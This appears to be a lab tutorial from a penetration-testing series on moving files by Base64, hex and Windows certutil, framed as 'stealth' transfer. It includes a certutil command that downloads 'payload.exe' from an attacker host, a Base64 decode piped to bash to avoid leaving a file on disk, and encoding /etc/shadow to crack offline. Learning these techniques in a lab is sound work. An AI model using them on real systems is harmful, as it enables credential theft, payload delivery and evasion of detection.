# 🕵️ Encoding & Stealth Transfer — Step-by-Step Guide

> **What is it?** Instead of transferring a file over the network, you **convert the file to text** (Base64 or Hex), copy-paste the text, and then **convert it back** on the other machine. No file transfer tools needed!

> **When to use?** When the target has NO transfer tools (no wget, curl, nc, ftp) — but you have a shell. Also useful for **stealth** because no network file transfer happens.

---

## 📋 What You Need

| Item                                  | Details                                                |
| ------------------------------------- | ------------------------------------------------------ |
| **Tools needed**                      | `base64`, `xxd` — pre-installed on most Linux machines |
| **Shell access**                      | You need command execution on both machines            |
| **No network transfer tools needed!** | That's the whole point                                 |

---

## 🧠 How It Works

```
Traditional Transfer:
  Kali ───[file over network]──→ Target

Encoding Transfer:
  Kali: file → encode to text → copy the text
  Target: paste the text → decode back to file
  
  No file ever crosses the network!
```

---

## 🔤 Method 1: Base64 Transfer

> **Base64** converts any file (text, binary, images) into a string of letters, numbers, `+`, `/`, and `=`.

### Step 1: On the SOURCE machine — encode the file

```bash
# Encode a file to Base64
base64 -w 0 test_file.txt
```

> **`-w 0`** means no line wrapping — output is one long line.

Output will look like:

```
VGhpcyBpcyBhIHRlc3QgZmlsZSBmcm9tIEthbGkK
```

### Step 2: Copy that output string

> Select the entire Base64 string and copy it.

### Step 3: On the DESTINATION machine — decode it

```bash
echo "VGhpcyBpcyBhIHRlc3QgZmlsZSBmcm9tIEthbGkK" | base64 -d > test_file.txt
```

> **What happens:**
> - `echo "..."` = the Base64 string you copied
> - `| base64 -d` = decode it back to the original file
> - `> test_file.txt` = save it

### Step 4: Verify

```bash
cat test_file.txt
# Should show: "This is a test file from Kali"
```

---

## 🔤 Method 2: Base64 — Transfer a Script

### On Kali — encode a script

```bash
# Create a test script
echo -e '#!/bin/bash\necho "Transfer successful!"\nwhoami\nid' > my_script.sh

# Encode it
base64 -w 0 my_script.sh
```

Output:

```
IyEvYmluL2Jhc2gKZWNobyAiVHJhbnNmZXIgc3VjY2Vzc2Z1bCEiCndob2FtaQppZAo=
```

### On Target — decode and run

```bash
echo "IyEvYmluL2Jhc2gKZWNobyAiVHJhbnNmZXIgc3VjY2Vzc2Z1bCEiCndob2FtaQppZAo=" | base64 -d > my_script.sh
chmod +x my_script.sh
./my_script.sh
```

### Or decode and execute in ONE step (no file on disk!)

```bash
echo "IyEvYmluL2Jhc2gKZWNobyAiVHJhbnNmZXIgc3VjY2Vzc2Z1bCEiCndob2FtaQppZAo=" | base64 -d | bash
```

> 💡 This runs the script **without saving it** — very stealthy!

---

## 🔢 Method 3: Hex Transfer

> **Hex encoding** converts file data to hexadecimal (0-9, a-f). Alternative to Base64.

### On SOURCE — encode to hex

```bash
xxd -p test_file.txt | tr -d '\n'
```

Output:

```
5468697320697320612074657374...
```

### On DESTINATION — decode from hex

```bash
echo "5468697320697320612074657374..." | xxd -r -p > test_file.txt
```

> **Flags:**
> - `xxd -p` = plain hex output (no addresses)
> - `xxd -r -p` = reverse (decode) from plain hex

### Verify

```bash
cat test_file.txt
```

---

## 🪟 Method 4: Certutil (Windows Only)

> **Certutil** is a built-in Windows tool. It's meant for certificate management but can download files and do Base64 encoding.

### Download a file (like wget for Windows)

```cmd
REM Download file from Kali's HTTP server
certutil -urlcache -f http://192.168.56.10:8080/payload.exe C:\temp\payload.exe
```

> **Breaking it down:**
> - `-urlcache` = use URL cache feature
> - `-f` = force (overwrite if exists)
> - URL = where to download from
> - Last part = where to save it

### Base64 encode a file (Windows)

```cmd
REM Encode file to Base64
certutil -encode input.exe encoded.txt

REM See the output
type encoded.txt
```

### Base64 decode a file (Windows)

```cmd
REM Decode Base64 back to original file
certutil -decode encoded.txt output.exe
```

### Full workflow on Windows

```cmd
REM Step 1: You have a Base64-encoded file (maybe copied from another machine)
REM Step 2: Save the Base64 text to a file
echo -----BEGIN CERTIFICATE----- > encoded.txt
echo BASE64_CONTENT_HERE >> encoded.txt
echo -----END CERTIFICATE----- >> encoded.txt

REM Step 3: Decode it
certutil -decode encoded.txt original_file.exe
```

> ⚠️ Certutil is sometimes flagged by antivirus — it's a known tool used by attackers.

---

## 📋 Method 5: Transfer Using /etc/passwd as Example

> **Real-world scenario**: You found `/etc/shadow` on a target and want to bring it back to Kali without using any file transfer tools.

### On Target (Metasploitable)

```bash
# Encode the sensitive file
base64 -w 0 /etc/shadow
```

> Copy the long Base64 output string.

### On Kali

```bash
# Paste and decode
echo "PASTE_THE_BASE64_STRING_HERE" | base64 -d > target_shadow.txt

# Now you can crack it offline!
cat target_shadow.txt
```

---

## ✅ Verification: Always Check Your Transfer!

```bash
# Method 1: Use diff (if you have both files)
diff original_file decoded_file

# Method 2: Compare md5 hashes
md5sum original_file
md5sum decoded_file
# Hashes should match!
```

---

## 🧠 Quick Reference Cheatsheet

| What You Want          | Linux Command                    | Windows Command                  |
| ---------------------- | -------------------------------- | -------------------------------- |
| **Encode to Base64**   | `base64 -w 0 file`               | `certutil -encode file out.txt`  |
| **Decode from Base64** | `echo "str" \| base64 -d > file` | `certutil -decode in.txt file`   |
| **Encode to Hex**      | `xxd -p file \| tr -d '\n'`      | N/A                              |
| **Decode from Hex**    | `echo "hex" \| xxd -r -p > file` | N/A                              |
| **Download (Windows)** | N/A                              | `certutil -urlcache -f URL path` |

---

## ❗ Common Mistakes & Fixes

| Problem                            | Fix                                             |
| ---------------------------------- | ----------------------------------------------- |
| Decoded file is corrupted          | Make sure you copied the ENTIRE Base64 string   |
| Base64 has line breaks             | Use `-w 0` flag when encoding                   |
| Windows certutil fails             | Check if antivirus is blocking it               |
| Binary file won't run after decode | `chmod +x` on Linux                             |
| Hex string too long                | Use Base64 instead — it produces shorter output |

---

## ⚖️ Encoding vs Other Methods

| Feature             | Base64/Hex         | HTTP        | Netcat         | SCP             |
| ------------------- | ------------------ | ----------- | -------------- | --------------- |
| Needs network tools | ❌ No               | Yes         | Yes            | Yes             |
| Stealth level       | ⭐⭐⭐ Very High      | Low         | Medium         | High            |
| File size limit     | Small files only   | Any         | Any            | Any             |
| Speed               | Slow (copy-paste)  | Fast        | Fast           | Fast            |
| Best for            | No tools available | General use | Quick transfer | Secure transfer |

> ⚠️ **Limitation**: Encoding is only practical for **small files** (a few KB). For large files, use HTTP or SCP instead.

---

## ✅ Practice Checklist

- [ ] Base64 encode `test_file.txt` on Kali
- [ ] Decode the Base64 string on Metasploitable
- [ ] Base64 encode and decode a script, then run it
- [ ] Try the "decode and execute" one-liner (no file on disk)
- [ ] Hex encode a file with `xxd` and decode it back
- [ ] Verify transfer integrity using `md5sum` or `diff`
- [ ] (Windows) Try `certutil` download and encode/decode

---

> 🔙 **Previous**: [FTP / TFTP Transfer](./05_ftp_tftp_transfer.md)
> 🔙 **Back to**: [File Transfer Main Guide](./file_transfer.md)
> ➡️ **Next**: [PowerShell & Windows Transfer](./07_powershell_windows_transfer.md)
